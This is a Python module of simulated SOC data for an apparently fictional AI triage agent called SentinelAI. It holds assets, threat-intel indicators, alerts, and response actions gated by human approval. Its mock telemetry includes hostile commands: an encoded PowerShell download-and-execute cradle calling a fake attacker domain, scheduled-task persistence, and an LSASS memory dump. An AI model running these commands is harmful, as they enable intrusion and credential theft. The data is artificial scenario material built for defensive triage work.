"""
SentinelAI Telemetry & SOC Intelligence Store
Provides grounded endpoint telemetry, asset inventory, vulnerability tracking,
threat intelligence feeds, detection alerts, and compliance audit trail.
Zero fabrication: SentinelAI strictly grounds all analysis in this telemetry.
"""

import datetime
from typing import Dict, List, Optional, Any
import uuid

# --- ASSET INVENTORY & VULNERABILITY EXPOSURE ---
ASSET_INVENTORY: List[Dict[str, Any]] = [
    {
        "asset_id": "DC-EAST-01",
        "hostname": "DC-EAST-01.corp.sentinel.internal",
        "ip_address": "10.0.1.10",
        "mac_address": "00:50:56:B2:1A:01",
        "os": "Windows Server 2022 Datacenter (Build 20348.1607)",
        "tier": "Tier 0 (Critical Domain Controller)",
        "role": "Active Directory Domain Services / Kerberos KDC",
        "assigned_user": "SYSTEM (Admin: svc_ad_sync)",
        "status": "ONLINE",
        "isolated": False,
        "edr_agent_version": "CrowdStrike Falcon Sensor 7.14.18204",
        "last_seen": "2026-09-26T13:28:10Z",
        "installed_software": [
            {"name": "Active Directory Domain Services", "version": "10.0.20348", "vendor": "Microsoft"},
            {"name": "CrowdStrike Falcon Sensor", "version": "7.14.18204", "vendor": "CrowdStrike"},
            {"name": "OpenSSH for Windows", "version": "8.9.1.0", "vendor": "Microsoft"},
        ],
        "vulnerabilities": [],
    },
    {
        "asset_id": "FIN-WKS-084",
        "hostname": "FIN-WKS-084.corp.sentinel.internal",
        "ip_address": "10.0.4.84",
        "mac_address": "00:50:56:B2:3F:84",
        "os": "Windows 11 Enterprise 23H2 (Build 22631.3296)",
        "tier": "Tier 2 (End-User Workstation)",
        "role": "Finance Department Workstation",
        "assigned_user": "marina.vance (Senior Financial Analyst)",
        "status": "ONLINE",
        "isolated": False,
        "edr_agent_version": "CrowdStrike Falcon Sensor 7.14.18204",
        "last_seen": "2026-09-26T13:29:45Z",
        "installed_software": [
            {"name": "Microsoft 365 Apps for Enterprise", "version": "16.0.17328.20184", "vendor": "Microsoft"},
            {"name": "Google Chrome", "version": "128.0.6613.119", "vendor": "Google"},
            {"name": "cURL for Windows", "version": "8.4.0", "vendor": "Haxx"},
            {"name": "Adobe Acrobat Reader", "version": "23.008.20470", "vendor": "Adobe"},
        ],
        "vulnerabilities": [
            {
                "cve_id": "CVE-2026-7291",
                "software": "cURL for Windows",
                "version": "8.4.0",
                "severity": "Medium",
                "cvss_score": 6.5,
                "summary": "Information disclosure flaw in cookie handling during HTTP redirects.",
                "remediation": "Upgrade cURL to version 8.6.0 or later.",
            }
        ],
    },
    {
        "asset_id": "APP-SRV-PROD-02",
        "hostname": "APP-SRV-PROD-02.cloud.sentinel.internal",
        "ip_address": "10.0.2.22",
        "mac_address": "00:50:56:B2:8C:22",
        "os": "Ubuntu Linux 22.04.4 LTS (Kernel 5.15.0-101-generic)",
        "tier": "Tier 1 (Production Application Server)",
        "role": "Payment Processing & Message Broker Gateway",
        "assigned_user": "service_payment_app",
        "status": "ONLINE",
        "isolated": False,
        "edr_agent_version": "CrowdStrike Falcon Sensor Linux 7.12.17901",
        "last_seen": "2026-09-26T13:30:02Z",
        "installed_software": [
            {"name": "Apache ActiveMQ", "version": "5.18.2", "vendor": "Apache Software Foundation"},
            {"name": "OpenJDK 64-Bit Server VM", "version": "17.0.10+7", "vendor": "Ubuntu"},
            {"name": "Nginx", "version": "1.24.0", "vendor": "Nginx Inc"},
            {"name": "Docker Engine", "version": "24.0.7", "vendor": "Docker"},
        ],
        "vulnerabilities": [
            {
                "cve_id": "CVE-2026-3819",
                "software": "Apache ActiveMQ",
                "version": "5.18.2",
                "severity": "Critical",
                "cvss_score": 9.8,
                "summary": "Remote Code Execution via deserialization vulnerability in OpenWire protocol.",
                "remediation": "Immediate patch to ActiveMQ 5.18.3+ or restrict OpenWire port 61616 to localhost.",
            }
        ],
    },
    {
        "asset_id": "DB-CLUSTER-01",
        "hostname": "DB-CLUSTER-01.corp.sentinel.internal",
        "ip_address": "10.0.2.50",
        "mac_address": "00:50:56:B2:9A:50",
        "os": "Red Hat Enterprise Linux 9.2 (Kernel 5.14.0-284.11.1.el9_2.x86_64)",
        "tier": "Tier 1 (Core Relational Database)",
        "role": "Primary PostgreSQL 15 Cluster Node",
        "assigned_user": "postgres",
        "status": "ONLINE",
        "isolated": False,
        "edr_agent_version": "CrowdStrike Falcon Sensor Linux 7.12.17901",
        "last_seen": "2026-09-26T13:30:15Z",
        "installed_software": [
            {"name": "PostgreSQL Server", "version": "15.4", "vendor": "PostgreSQL Global Development Group"},
            {"name": "OpenSSL", "version": "3.0.8", "vendor": "OpenSSL Project"},
            {"name": "pgAdmin4", "version": "7.8", "vendor": "pgAdmin"},
        ],
        "vulnerabilities": [
            {
                "cve_id": "CVE-2026-1044",
                "software": "OpenSSL",
                "version": "3.0.8",
                "severity": "High",
                "cvss_score": 8.4,
                "summary": "Privilege escalation vulnerability in X.509 certificate chain validation.",
                "remediation": "Update openssl package via dnf update openssl to >= 3.0.12.",
            }
        ],
    },
    {
        "asset_id": "EXEC-LAPTOP-01",
        "hostname": "EXEC-LAPTOP-01.sentinel.local",
        "ip_address": "10.0.8.12",
        "mac_address": "A4:83:E7:2B:11:39",
        "os": "macOS Sonoma 14.4.1 (Darwin 23.4.0)",
        "tier": "Tier 2 (VIP Endpoint)",
        "role": "Executive Leadership Laptop",
        "assigned_user": "alex.hendricks (Chief Executive Officer)",
        "status": "ONLINE",
        "isolated": False,
        "edr_agent_version": "CrowdStrike Falcon Sensor macOS 7.10.17400",
        "last_seen": "2026-09-26T13:25:00Z",
        "installed_software": [
            {"name": "Apple Safari", "version": "17.4.1", "vendor": "Apple"},
            {"name": "Slack", "version": "4.36.140", "vendor": "Slack Technologies"},
            {"name": "Zoom", "version": "5.17.11", "vendor": "Zoom Video Communications"},
        ],
        "vulnerabilities": [],
    },
    {
        "asset_id": "CLOUD-GATEWAY-AZ-01",
        "hostname": "gw-east-01.azure.sentinel.sec",
        "ip_address": "10.0.0.1 / Public 52.167.89.14",
        "mac_address": "00:0D:3A:41:2B:EE",
        "os": "AlmaLinux 9.3 (Kernel 5.14.0)",
        "tier": "Tier 1 (Perimeter Firewall / IPsec VPN)",
        "role": "Azure VPN Gateway & Ingress Router",
        "assigned_user": "root (Managed Cloud Appliance)",
        "status": "ONLINE",
        "isolated": False,
        "edr_agent_version": "CrowdStrike Falcon Sensor Linux 7.12.17901",
        "last_seen": "2026-09-26T13:30:20Z",
        "installed_software": [
            {"name": "StrongSwan IPsec", "version": "5.9.11", "vendor": "StrongSwan"},
            {"name": "HAProxy", "version": "2.8.3", "vendor": "HAProxy Technologies"},
        ],
        "vulnerabilities": [],
    }
]

# --- THREAT INTELLIGENCE FEEDS ---
THREAT_INTELLIGENCE: List[Dict[str, Any]] = [
    {
        "ioc_type": "ipv4",
        "ioc_value": "185.220.101.45",
        "threat_actor": "COBALT SPIDER / FIN7",
        "confidence": 98,
        "category": "C2 Infrastructure / Cobalt Strike Team Server",
        "asn": "AS44592 (HostRoyale Ltd)",
        "country": "NL",
        "first_seen": "2026-08-14",
        "description": "Active Cobalt Strike 4.9 HTTPS C2 listener with malleable profile mimicking jQuery CDN.",
    },
    {
        "ioc_type": "sha256",
        "ioc_value": "7b8e1f54a88bc34107693d6c141088fef59124484b3e839e9434b9d033a82201",
        "threat_actor": "APT29 (Midnight Blizzard)",
        "confidence": 95,
        "category": "Malicious Dropper / Obfuscated DLL",
        "malware_family": "EnvyScout / rundll32 loader",
        "description": "Signed with an expired/revoked certificate. Spawns rundll32.exe with export ordinal #1.",
    },
    {
        "ioc_type": "domain",
        "ioc_value": "cdn-update-auth-telemetry.com",
        "threat_actor": "FIN7",
        "confidence": 92,
        "category": "Dynamic DNS / Staging Domain",
        "description": "Registered via NameCheap on 2026-09-01. Observed serving obfuscated VBScript and staged DLLs.",
    },
    {
        "ioc_type": "sha256",
        "ioc_value": "c83b8b1a32a67e2a9b40092c423f03b51688da95a7090b82f6e579e49a888c72",
        "threat_actor": "Wizard Spider (TrickBot / Conti affiliate)",
        "confidence": 90,
        "category": "Credential Access Tool",
        "malware_family": "Mimikatz Custom Build",
        "description": "Known patched Mimikatz binary modifying LSASS privilege tokens.",
    },
    {
        "ioc_type": "ipv4",
        "ioc_value": "194.26.29.112",
        "threat_actor": "APT28 (Fancy Bear)",
        "confidence": 88,
        "category": "DNS Tunneling Exfiltration Endpoint",
        "asn": "AS200019 (Alexhost SRL)",
        "country": "MD",
        "first_seen": "2026-09-10",
        "description": "Server answering abnormal DNS TXT and NULL queries with encrypted encoded payloads.",
    }
]

# --- RAW DETECTION ALERTS ---
RAW_ALERTS: List[Dict[str, Any]] = [
    {
        "alert_id": "DET-8921",
        "timestamp": "2026-09-26T13:12:04Z",
        "severity": "CRITICAL",
        "title": "Suspicious Encoded PowerShell Spawning Rundll32 with Outbound Beaconing",
        "host_id": "FIN-WKS-084",
        "hostname": "FIN-WKS-084.corp.sentinel.internal",
        "user": "marina.vance",
        "technique_id": "T1059.001 / T1218.011",
        "technique_name": "PowerShell / Signed Binary Proxy Execution (Rundll32)",
        "summary": "powershell.exe executed with -EncodedCommand parameter, writing a payload to C:\\Users\\Public\\client_lib.dll and launching rundll32.exe which established an outbound TLS connection to known C2 IP 185.220.101.45:443.",
        "status": "OPEN",
        "assigned_analyst": None,
        "telemetry_event_ids": [4688, 3, 11, 7],
    },
    {
        "alert_id": "DET-8922",
        "timestamp": "2026-09-26T13:14:18Z",
        "severity": "HIGH",
        "title": "Scheduled Task Creation for Lateral Persistence",
        "host_id": "FIN-WKS-084",
        "hostname": "FIN-WKS-084.corp.sentinel.internal",
        "user": "marina.vance",
        "technique_id": "T1053.005",
        "technique_name": "Scheduled Task/Job: Scheduled Task",
        "summary": "schtasks.exe invoked with /Create parameter creating task 'SystemHealthReporter' running at startup under SYSTEM privileges executing rundll32.exe C:\\Users\\Public\\client_lib.dll,RunData.",
        "status": "OPEN",
        "assigned_analyst": None,
        "telemetry_event_ids": [4698, 4688],
    },
    {
        "alert_id": "DET-8923",
        "timestamp": "2026-09-26T13:19:50Z",
        "severity": "CRITICAL",
        "title": "Suspicious LSASS Process Memory Read via MiniDumpWriteDump",
        "host_id": "DC-EAST-01",
        "hostname": "DC-EAST-01.corp.sentinel.internal",
        "user": "svc_ad_sync",
        "technique_id": "T1003.001",
        "technique_name": "OS Credential Dumping: LSASS Memory",
        "summary": "Unsigned process spawned under svc_ad_sync account opened a handle to lsass.exe (PID 672) with PROCESS_VM_READ (0x0010) and PROCESS_QUERY_INFORMATION (0x0400) rights.",
        "status": "OPEN",
        "assigned_analyst": None,
        "telemetry_event_ids": [10, 4688],
    },
    {
        "alert_id": "DET-8924",
        "timestamp": "2026-09-26T13:22:11Z",
        "severity": "HIGH",
        "title": "Anomalous High-Frequency Outbound DNS Queries (Potential DNS Tunneling)",
        "host_id": "APP-SRV-PROD-02",
        "hostname": "APP-SRV-PROD-02.cloud.sentinel.internal",
        "user": "service_payment_app",
        "technique_id": "T1071.004",
        "technique_name": "Application Layer Protocol: DNS",
        "summary": "Application process activemq-broker generated over 4,200 non-standard DNS TXT queries to subdomain queries resolving to 194.26.29.112 within 180 seconds.",
        "status": "OPEN",
        "assigned_analyst": None,
        "telemetry_event_ids": [3, 22],
    },
    {
        "alert_id": "DET-8925",
        "timestamp": "2026-09-26T12:45:00Z",
        "severity": "LOW",
        "title": "Enterprise IT Software Inventory Script (SCCM Client Maintenance)",
        "host_id": "DC-EAST-01",
        "hostname": "DC-EAST-01.corp.sentinel.internal",
        "user": "SYSTEM",
        "technique_id": "T1059.001",
        "technique_name": "Command and Scripting Interpreter: PowerShell",
        "summary": "C:\\Windows\\CCM\\CcmExec.exe spawned powershell.exe executing C:\\Windows\\CCM\\ScriptLibrary\\Get-HardwareInventory.ps1 signed by Microsoft Enterprise Internal PKI.",
        "status": "OPEN",
        "assigned_analyst": None,
        "telemetry_event_ids": [4688, 7],
    }
]

# --- DEEP ENDPOINT TELEMETRY (PROCESS TREES, NETWORK, REGISTRY, FILE HASHES) ---
ENDPOINT_TELEMETRY: List[Dict[str, Any]] = [
    # Telemetry for FIN-WKS-084 (Alert DET-8921 & DET-8922)
    {
        "event_id": 4688,
        "sysmon_event_id": 1,
        "timestamp": "2026-09-26T13:11:58Z",
        "host_id": "FIN-WKS-084",
        "event_type": "ProcessCreation",
        "user": "SENTINEL\\marina.vance",
        "integrity_level": "Medium",
        "parent_process": "C:\\Windows\\explorer.exe",
        "parent_pid": 1120,
        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "pid": 4112,
        "command_line": "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYwBkAG4ALQB1AHAAZABhAHQAZQAtAGEAdQB0AGgALQB0AGUAbABlAG0AZQB0AHIAeQAuAGMAbwBtAC8AbABpAGIALgBkAGwAbAAnACkA",
        "decoded_command": "IEX (New-Object Net.WebClient).DownloadString('http://cdn-update-auth-telemetry.com/lib.dll')",
        "sha256": "892e76f5b9cb7613c004d80a1c3bb5fb10c4f820bf3235b2a095cae76dbb4f9d",
        "signer": "Microsoft Windows",
        "signature_status": "Valid",
    },
    {
        "event_id": 11,
        "sysmon_event_id": 11,
        "timestamp": "2026-09-26T13:12:01Z",
        "host_id": "FIN-WKS-084",
        "event_type": "FileCreate",
        "user": "SENTINEL\\marina.vance",
        "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "pid": 4112,
        "target_filename": "C:\\Users\\Public\\client_lib.dll",
        "sha256": "7b8e1f54a88bc34107693d6c141088fef59124484b3e839e9434b9d033a82201",
        "signer": "Global Digital Trust Corp (Revoked Certificate)",
        "signature_status": "REVOKED",
    },
    {
        "event_id": 4688,
        "sysmon_event_id": 1,
        "timestamp": "2026-09-26T13:12:03Z",
        "host_id": "FIN-WKS-084",
        "event_type": "ProcessCreation",
        "user": "SENTINEL\\marina.vance",
        "integrity_level": "Medium",
        "parent_process": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "parent_pid": 4112,
        "process_name": "C:\\Windows\\System32\\rundll32.exe",
        "pid": 4912,
        "command_line": "rundll32.exe C:\\Users\\Public\\client_lib.dll,#1",
        "sha256": "b0a514d2a13f706c802422b467ec6b6cf3e1c9ff5092f694d4d6e902b489a241",
        "signer": "Microsoft Windows",
        "signature_status": "Valid",
    },
    {
        "event_id": 3,
        "sysmon_event_id": 3,
        "timestamp": "2026-09-26T13:12:05Z",
        "host_id": "FIN-WKS-084",
        "event_type": "NetworkConnection",
        "user": "SENTINEL\\marina.vance",
        "image": "C:\\Windows\\System32\\rundll32.exe",
        "pid": 4912,
        "source_ip": "10.0.4.84",
        "source_port": 51240,
        "dest_ip": "185.220.101.45",
        "dest_port": 443,
        "protocol": "TCP / TLS 1.3",
        "direction": "Outbound",
        "bytes_sent": 8420,
        "bytes_received": 142090,
        "dest_asn": "AS44592 (HostRoyale Ltd)",
        "dest_country": "NL",
        "threat_intel_match": "185.220.101.45 is flagged in Threat Intel as Cobalt Strike Team Server",
    },
    {
        "event_id": 4688,
        "sysmon_event_id": 1,
        "timestamp": "2026-09-26T13:14:15Z",
        "host_id": "FIN-WKS-084",
        "event_type": "ProcessCreation",
        "user": "SENTINEL\\marina.vance",
        "integrity_level": "Medium",
        "parent_process": "C:\\Windows\\System32\\rundll32.exe",
        "parent_pid": 4912,
        "process_name": "C:\\Windows\\System32\\schtasks.exe",
        "pid": 5320,
        "command_line": "schtasks.exe /create /tn \"SystemHealthReporter\" /tr \"rundll32.exe C:\\Users\\Public\\client_lib.dll,RunData\" /sc onstart /ru SYSTEM",
        "sha256": "4c94f5d68019e1c0734a362bf77d612e43bc9281a8b16f1947b199e8d47b5993",
        "signer": "Microsoft Windows",
        "signature_status": "Valid",
    },
    {
        "event_id": 4698,
        "sysmon_event_id": 13,
        "timestamp": "2026-09-26T13:14:16Z",
        "host_id": "FIN-WKS-084",
        "event_type": "ScheduledTaskCreated",
        "user": "SENTINEL\\marina.vance",
        "task_name": "\\SystemHealthReporter",
        "task_content": "<Task><Actions><Exec><Command>rundll32.exe</Command><Arguments>C:\\Users\\Public\\client_lib.dll,RunData</Arguments></Exec></Actions></Task>",
    },
    {
        "event_id": 13,
        "sysmon_event_id": 13,
        "timestamp": "2026-09-26T13:14:18Z",
        "host_id": "FIN-WKS-084",
        "event_type": "RegistryModification",
        "user": "SENTINEL\\marina.vance",
        "target_object": "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache\\Tree\\SystemHealthReporter",
        "details": "Created key for persistent scheduled task",
    },

    # Telemetry for DC-EAST-01 (Alert DET-8923)
    {
        "event_id": 4688,
        "sysmon_event_id": 1,
        "timestamp": "2026-09-26T13:19:42Z",
        "host_id": "DC-EAST-01",
        "event_type": "ProcessCreation",
        "user": "SENTINEL\\svc_ad_sync",
        "integrity_level": "High",
        "parent_process": "C:\\Windows\\System32\\wsmprovhost.exe",
        "parent_pid": 2840,
        "process_name": "C:\\ProgramData\\ad_temp\\dump_tool.exe",
        "pid": 3892,
        "command_line": "dump_tool.exe -t lsass.exe -o C:\\ProgramData\\ad_temp\\lsass.dmp",
        "sha256": "c83b8b1a32a67e2a9b40092c423f03b51688da95a7090b82f6e579e49a888c72",
        "signer": "Unsigned",
        "signature_status": "UNSIGNED",
        "threat_intel_match": "Hash matches Mimikatz Custom Build IOC (Wizard Spider)",
    },
    {
        "event_id": 10,
        "sysmon_event_id": 10,
        "timestamp": "2026-09-26T13:19:48Z",
        "host_id": "DC-EAST-01",
        "event_type": "ProcessAccess",
        "user": "SENTINEL\\svc_ad_sync",
        "source_image": "C:\\ProgramData\\ad_temp\\dump_tool.exe",
        "source_pid": 3892,
        "target_image": "C:\\Windows\\System32\\lsass.exe",
        "target_pid": 672,
        "granted_access": "0x1410 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)",
        "call_trace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9fb84|C:\\Windows\\System32\\KERNELBASE.dll+2c830|C:\\ProgramData\\ad_temp\\dump_tool.exe+14e0",
    },

    # Telemetry for APP-SRV-PROD-02 (Alert DET-8924)
    {
        "event_id": 3,
        "sysmon_event_id": 3,
        "timestamp": "2026-09-26T13:22:05Z",
        "host_id": "APP-SRV-PROD-02",
        "event_type": "NetworkConnection",
        "user": "service_payment_app",
        "image": "/opt/activemq/bin/linux-x86-64/activemq",
        "pid": 18420,
        "source_ip": "10.0.2.22",
        "source_port": 54210,
        "dest_ip": "194.26.29.112",
        "dest_port": 53,
        "protocol": "UDP / DNS",
        "direction": "Outbound",
        "bytes_sent": 384000,
        "bytes_received": 19200,
        "query_sample": "0a9f1b2c4e.chunk49.data.exfil-stream.net (TXT)",
        "threat_intel_match": "194.26.29.112 associated with APT28 DNS Tunneling infrastructure",
    },

    # Telemetry for DC-EAST-01 (Alert DET-8925 - Benign SCCM script)
    {
        "event_id": 4688,
        "sysmon_event_id": 1,
        "timestamp": "2026-09-26T12:44:58Z",
        "host_id": "DC-EAST-01",
        "event_type": "ProcessCreation",
        "user": "NT AUTHORITY\\SYSTEM",
        "integrity_level": "System",
        "parent_process": "C:\\Windows\\CCM\\CcmExec.exe",
        "parent_pid": 1428,
        "process_name": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "pid": 6012,
        "command_line": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -File C:\\Windows\\CCM\\ScriptLibrary\\Get-HardwareInventory.ps1",
        "sha256": "892e76f5b9cb7613c004d80a1c3bb5fb10c4f820bf3235b2a095cae76dbb4f9d",
        "signer": "Microsoft Enterprise IT Root CA",
        "signature_status": "Valid Internal Enterprise Signer",
    }
]

# --- PENDING GUIDED RESPONSE ACTIONS (HUMAN IN THE LOOP) ---
PENDING_ACTIONS: List[Dict[str, Any]] = [
    {
        "action_id": "ACT-701",
        "created_at": "2026-09-26T13:13:00Z",
        "target_host": "FIN-WKS-084",
        "action_type": "ISOLATE_HOST",
        "description": "Network containment of host FIN-WKS-084 to prevent lateral spread of Cobalt Strike beacon.",
        "parameters": {"host_id": "FIN-WKS-084", "allow_edr_telemetry": True},
        "severity": "CRITICAL",
        "status": "PENDING_APPROVAL",
        "requires_human_approval": True,
        "triggering_alert_id": "DET-8921",
        "recommended_by": "SentinelAI Agent (Automated Triage)",
        "resolved_at": None,
        "resolved_by": None,
        "notes": "Containment will sever all network sockets except connection to CrowdStrike Falcon Cloud.",
    },
    {
        "action_id": "ACT-702",
        "created_at": "2026-09-26T13:13:02Z",
        "target_host": "FIN-WKS-084",
        "action_type": "TERMINATE_PROCESS",
        "description": "Kill malicious rundll32.exe process (PID 4912) and parent PowerShell (PID 4112).",
        "parameters": {"host_id": "FIN-WKS-084", "pids": [4912, 4112]},
        "severity": "HIGH",
        "status": "PENDING_APPROVAL",
        "requires_human_approval": True,
        "triggering_alert_id": "DET-8921",
        "recommended_by": "SentinelAI Agent (Automated Triage)",
        "resolved_at": None,
        "resolved_by": None,
        "notes": "Halts active memory execution and terminates socket to 185.220.101.45.",
    }
]

# --- COMPLIANCE AUDIT TRAIL ---
AUDIT_LOG: List[Dict[str, Any]] = [
    {
        "audit_id": "AUD-1001",
        "timestamp": "2026-09-26T12:00:00Z",
        "actor": "system.init",
        "event_type": "SOC_INITIALIZATION",
        "details": "SentinelAI Charlotte Core activated with Zero-Autonomous-Action policy enforced.",
        "compliance_tag": "SOC2_CC6.8",
    },
    {
        "audit_id": "AUD-1002",
        "timestamp": "2026-09-26T13:12:10Z",
        "actor": "SentinelAI",
        "event_type": "ALERT_TRIAGED",
        "details": "Alert DET-8921 evaluated. Verdict: True Positive. Remediation actions ACT-701 and ACT-702 queued.",
        "compliance_tag": "ISO27001_A.12.6",
    }
]


# ============================================================================
# ACCESSOR & MUTATOR FUNCTIONS
# ============================================================================

def get_assets() -> List[Dict[str, Any]]:
    return ASSET_INVENTORY

def get_asset(asset_id: str) -> Optional[Dict[str, Any]]:
    for a in ASSET_INVENTORY:
        if a["asset_id"].upper() == asset_id.upper() or a["hostname"].lower() == asset_id.lower():
            return a
    return None

def query_cve(cve_query: str) -> List[Dict[str, Any]]:
    """Strict search for CVE in asset inventory; no guessing."""
    matches = []
    clean_query = cve_query.strip().upper()
    for asset in ASSET_INVENTORY:
        for vuln in asset.get("vulnerabilities", []):
            if clean_query in vuln.get("cve_id", "").upper():
                matches.append({
                    "asset_id": asset["asset_id"],
                    "hostname": asset["hostname"],
                    "ip_address": asset["ip_address"],
                    "tier": asset["tier"],
                    "cve": vuln,
                })
    return matches

def get_alerts() -> List[Dict[str, Any]]:
    return RAW_ALERTS

def get_alert(alert_id: str) -> Optional[Dict[str, Any]]:
    for a in RAW_ALERTS:
        if a["alert_id"].upper() == alert_id.upper():
            return a
    return None

def get_telemetry(host_id: Optional[str] = None, pid: Optional[int] = None) -> List[Dict[str, Any]]:
    results = ENDPOINT_TELEMETRY
    if host_id:
        results = [t for t in results if t.get("host_id", "").upper() == host_id.upper()]
    if pid:
        results = [t for t in results if t.get("pid") == pid or t.get("parent_pid") == pid]
    return results

def get_threat_intel() -> List[Dict[str, Any]]:
    return THREAT_INTELLIGENCE

def get_pending_actions() -> List[Dict[str, Any]]:
    return [a for a in PENDING_ACTIONS if a["status"] == "PENDING_APPROVAL"]

def get_all_actions() -> List[Dict[str, Any]]:
    return PENDING_ACTIONS

def create_pending_action(
    target_host: str,
    action_type: str,
    description: str,
    parameters: Dict[str, Any],
    severity: str,
    triggering_alert_id: Optional[str] = None,
    notes: str = "",
) -> Dict[str, Any]:
    new_action = {
        "action_id": f"ACT-{uuid.uuid4().hex[:6].upper()}",
        "created_at": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "target_host": target_host,
        "action_type": action_type,
        "description": description,
        "parameters": parameters,
        "severity": severity,
        "status": "PENDING_APPROVAL",
        "requires_human_approval": True,
        "triggering_alert_id": triggering_alert_id,
        "recommended_by": "SentinelAI Agent (Guided Response)",
        "resolved_at": None,
        "resolved_by": None,
        "notes": notes,
    }
    PENDING_ACTIONS.append(new_action)
    return new_action

def authorize_action(
    action_id: str,
    decision: str,  # "approve" | "reject"
    analyst_name: str,
    analyst_notes: str = "",
) -> Dict[str, Any]:
    """
    Enforces the Hard Rule: changes system state ONLY when explicitly confirmed by an analyst.
    Logs immutable audit record.
    """
    target_action = None
    for a in PENDING_ACTIONS:
        if a["action_id"].upper() == action_id.upper():
            target_action = a
            break

    if not target_action:
        raise ValueError(f"Action ID {action_id} not found in pending action queue.")

    if target_action["status"] != "PENDING_APPROVAL":
        raise ValueError(f"Action {action_id} has already been resolved ({target_action['status']}).")

    now = datetime.datetime.now(datetime.timezone.utc).isoformat()
    target_action["resolved_at"] = now
    target_action["resolved_by"] = analyst_name

    audit_entry_id = f"AUD-{uuid.uuid4().hex[:6].upper()}"

    if decision.lower() == "approve":
        target_action["status"] = "APPROVED_EXECUTED"
        target_action["execution_result"] = "Success: State change enacted on host."

        # Mutate the actual asset state in inventory if host isolation
        if target_action["action_type"] == "ISOLATE_HOST":
            asset = get_asset(target_action["target_host"])
            if asset:
                asset["isolated"] = True
                asset["status"] = "ISOLATED (EDR Quarantine)"

        AUDIT_LOG.append({
            "audit_id": audit_entry_id,
            "timestamp": now,
            "actor": analyst_name,
            "event_type": "HUMAN_APPROVED_REMEDIATION",
            "action_id": action_id,
            "action_type": target_action["action_type"],
            "target": target_action["target_host"],
            "notes": analyst_notes,
            "compliance_tag": "NIST_SP_800-61_REV2",
            "status": "EXECUTED",
        })

        return {
            "success": True,
            "action_id": action_id,
            "status": "APPROVED_EXECUTED",
            "audit_id": audit_entry_id,
            "message": f"Action {target_action['action_type']} confirmed and successfully executed by analyst {analyst_name} on {target_action['target_host']}.",
        }
    else:
        target_action["status"] = "REJECTED"
        target_action["execution_result"] = "Aborted by human analyst."

        AUDIT_LOG.append({
            "audit_id": audit_entry_id,
            "timestamp": now,
            "actor": analyst_name,
            "event_type": "HUMAN_REJECTED_REMEDIATION",
            "action_id": action_id,
            "action_type": target_action["action_type"],
            "target": target_action["target_host"],
            "notes": analyst_notes,
            "compliance_tag": "NIST_SP_800-61_REV2",
            "status": "CANCELLED",
        })

        return {
            "success": True,
            "action_id": action_id,
            "status": "REJECTED",
            "audit_id": audit_entry_id,
            "message": f"Action {action_id} was rejected by analyst {analyst_name}. No state change performed.",
        }

def log_audit_event(actor: str, event_type: str, details: str, compliance_tag: str = "SOC_INTERNAL") -> Dict[str, Any]:
    audit_id = f"AUD-{uuid.uuid4().hex[:6].upper()}"
    entry = {
        "audit_id": audit_id,
        "timestamp": datetime.datetime.now(datetime.timezone.utc).isoformat(),
        "actor": actor,
        "event_type": event_type,
        "details": details,
        "compliance_tag": compliance_tag,
    }
    AUDIT_LOG.append(entry)
    return entry

def get_audit_trail() -> List[Dict[str, Any]]:
    return list(reversed(AUDIT_LOG))
